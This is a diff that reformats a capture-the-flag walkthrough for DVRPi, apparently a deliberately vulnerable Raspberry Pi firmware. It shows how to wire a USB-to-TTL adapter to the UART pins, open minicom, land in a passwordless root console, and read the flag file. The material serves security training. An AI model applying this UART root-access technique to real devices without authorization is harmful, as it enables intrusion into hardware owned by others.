@@ -38,70 +38,70 @@ Before starting, ensure you have the DVRPi firmware flashed to an SD card and th
 
 1. Acquire a USB-to-TTL Adapter:
    
-    - Purchase a 3.3V-compatible adapter (e.g., CP2102, FT232R). Avoid 5V adapters to prevent damaging the Pi’s GPIO pins.
-    - Example: Adafruit CP2102.
+- Purchase a 3.3V-compatible adapter (e.g., CP2102, FT232R). Avoid 5V adapters to prevent damaging the Pi’s GPIO pins.
+- Example: Adafruit CP2102.
       
 3. **Install Serial Terminal Software:**
    
-   - On Linux:
-     
-     ```
-     sudo apt update
-     sudo apt install -y minicom
-     ```
-     
-   - On MAC:
-     
-     ```
-     brew install minicom
-     ```
-     
-   - Alternative: Use screen (pre-installed on most systems).
+- On Linux:
+ 
+```
+sudo apt update
+sudo apt install -y minicom
+```
+ 
+- On MAC:
+ 
+```
+brew install minicom
+```
+   
+- Alternative: Use screen (pre-installed on most systems).
 
 4. **Identify the USB-to-TTL Adapter:**
    
-    - Plug the adapter into your computer’s USB port.
-    - Check the device name:
-      
-    ```
-    ls /dev/ttyUSB*  # Linux
-    ls /dev/tty.*     # macOS
-    ```
-    
-  - Example output: /dev/ttyUSB0 (Linux) or /dev/tty.usbserial-XXXX (macOS).
+- Plug the adapter into your computer’s USB port.
+- Check the device name:
+  
+```
+ls /dev/ttyUSB*  # Linux
+ls /dev/tty.*     # macOS
+```
+
+- Example output: /dev/ttyUSB0 (Linux) or /dev/tty.usbserial-XXXX (macOS).
 
 5. **Connect the Adapter to the Pi:**
    
-  - Power off the Raspberry Pi 4B to avoid short circuits:
-    
-    ```
-    sudo shutdown -h now
-    ```
-    
-    - Locate GPIO pins 14 (TX, pin 8) and 15 (RX, pin 10) on the Pi’s 40-pin header (Pinout Reference).
-    - Connect the adapter to the Pi using jumper wires:
-      
-    ```
-    Adapter GND → Pi GND (e.g., pin 6).
-    Adapter TX → Pi RX (GPIO 15, pin 10).
-    Adapter RX → Pi TX (GPIO 14, pin 8).
-    ```
-    
-    **Note:** Do not connect VCC (3.3V or 5V) from the adapter, as the Pi provides its own power.
-    Example wiring:
-    
-    ```
-    USB-to-TTL Adapter    Raspberry Pi 4B
-    ------------------    ---------------
-    GND                  GND (pin 6)
-    TX                   GPIO 15 (pin 10)
-    RX                   GPIO 14 (pin 8)
-    ```
+- Power off the Raspberry Pi 4B to avoid short circuits:
+
+```
+sudo shutdown -h now
+```
+
+- Locate GPIO pins 14 (TX, pin 8) and 15 (RX, pin 10) on the Pi’s 40-pin header (Pinout Reference).
+- Connect the adapter to the Pi using jumper wires:
+  
+```
+Adapter GND → Pi GND (e.g., pin 6).
+Adapter TX → Pi RX (GPIO 15, pin 10).
+Adapter RX → Pi TX (GPIO 14, pin 8).
+```
+
+**Note:** Do not connect VCC (3.3V or 5V) from the adapter, as the Pi provides its own power.
+Example wiring:
+
+```
+USB-to-TTL Adapter    Raspberry Pi 4B
+------------------    ---------------
+GND                  GND (pin 6)
+TX                   GPIO 15 (pin 10)
+RX                   GPIO 14 (pin 8)
+```
 
 6. **Power On the Pi:**
    
-   - Insert the SD card with the DVRPi firmware.
-   - Power on the Pi using a USB-C power supply.
+- Insert the SD card with the DVRPi firmware.
+- Power on the Pi using a USB-C power supply.
 
 ## Exploitation Steps
 
@@ -109,52 +109,53 @@ Follow these steps to exploit the unsecured UART console and retrieve the flag:
 
 1. **Launch the Serial Terminal:**
    
-   - Open minicom with the correct device and baud rate (115200, standard for Raspberry Pi):
+- Open minicom with the correct device and baud rate (115200, standard for Raspberry Pi):
 
-   ```
-   minicom -b 115200 -o -D /dev/ttyUSB0
-   ```
+```
+minicom -b 115200 -o -D /dev/ttyUSB0
+```
 
-  - Replace /dev/ttyUSB0 with your adapter’s device name.
-  - If using screen:
+- Replace /dev/ttyUSB0 with your adapter’s device name.
+- If using screen:
 
-  ```
-  screen /dev/ttyUSB0 115200
-  ```
+```
+screen /dev/ttyUSB0 115200
+```
 
 - Settings (optional, in minicom):
+  
   - 8 data bits, no parity, 1 stop bit (8N1).
   - Disable hardware/software flow control.
 
 2. **Access the Console:**
 
-  - Upon connecting, you should see the Pi’s boot output, followed by a login prompt:
+- Upon connecting, you should see the Pi’s boot output, followed by a login prompt:
 
-  ```
-  Debian GNU/Linux 12 DVRPi ttyS0
-  DVRPi login:
-  ```
+```
+Debian GNU/Linux 12 DVRPi ttyS0
+DVRPi login:
+```
 
-  - The DVRPi firmware is configured to provide a root shell without a password, so you’ll be logged in directly as **root:**
-  
-  ```
-  root@DVRPi:~#
-  ```
+- The DVRPi firmware is configured to provide a root shell without a password, so you’ll be logged in directly as **root:**
 
-  3. Retrieve the Flag:
+```
+root@DVRPi:~#
+```
 
-  ```
-  root@DVRPi:~# cat /root/flag.txt
-  flag{DVRPi_FLAG_UART:UART_ROOT_ACCESS}
-  ```
+3. Retrieve the Flag:
 
-  4. Exit the Console:
+```
+root@DVRPi:~# cat /root/flag.txt
+flag{DVRPi_FLAG_UART:UART_ROOT_ACCESS}
+```
 
-  - Log out:
+4. Exit the Console:
 
-  ```
-  exit
-  ```
+- Log out:
 
-  - Exit minicom: Press Ctrl-A, then X, and confirm.
-  - For screen: Press Ctrl-A, then \, and confirm.
+```
+exit
+```
+
+- Exit minicom: Press Ctrl-A, then X, and confirm.
+- For screen: Press Ctrl-A, then \, and confirm.
